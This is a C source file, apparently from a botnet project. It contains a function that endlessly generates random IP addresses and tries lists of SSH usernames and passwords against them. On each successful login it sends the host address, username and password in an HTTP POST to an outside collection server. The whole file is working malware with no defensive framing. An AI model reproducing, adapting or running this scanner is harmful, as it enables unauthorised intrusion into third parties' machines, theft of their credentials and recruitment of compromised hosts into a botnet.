#include "../includes/px_botnet.h"

void ft_scan_world(pthread_t thread)
{
	CURL *curl;
	CURLcode res;
	char ip[18];
	char *tmp;
	ssh_session ssh;
	char **user;
	char **pass;
	int x;
	int timeout;
	int rc;
	int error;

	user = ft_split(user_to_parse, ' ');
	pass = ft_split(pass_to_parse, ' ');
	curl = curl_easy_init();
	timeout = 10;
	srand(time(0));
	while (true)
	{
		x = 0;
		error = 0;
		ft_generate_ip(ip);
		while (x < user_len && error == 0)
		{
			ssh = ssh_new();
			ssh_options_set(ssh, SSH_OPTIONS_HOST, ip);
			ssh_options_set(ssh, SSH_OPTIONS_USER, user[x]);
			ssh_options_set(ssh, SSH_OPTIONS_TIMEOUT, &timeout);
			rc = ssh_connect(ssh);
			if (rc != SSH_OK)
			{
				error = 1;
			}
			else
			{
				rc = ssh_userauth_password(ssh, NULL, pass[x]);
				if (rc != SSH_AUTH_SUCCESS)
				{
					// dprintf(1, "\nError : %s - %d\n", ssh_get_error(threads->ssh), error);
				}
				else
				{
					tmp = ft_strjoin(ip, ":");
					tmp = ft_strnjoin(tmp, user[x], strlen(user[x]));
					tmp = ft_strnjoin(tmp, ":", 1);
					tmp = ft_strnjoin(tmp, pass[x], strlen(pass[x]));
					tmp = ft_strnjoinf("vuln_found=", tmp, strlen(tmp));
					curl_easy_setopt(curl, CURLOPT_URL, "https://gdjgufsdhugfsadyuihfyuisdghf.pandeo.fr/api.php");
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					error = 2;
					free(tmp);
				}
			}
			ssh_disconnect(ssh);
			if (ssh != NULL)
				ssh_free(ssh);
			x++;
		}
		sleep(1);
	}
}
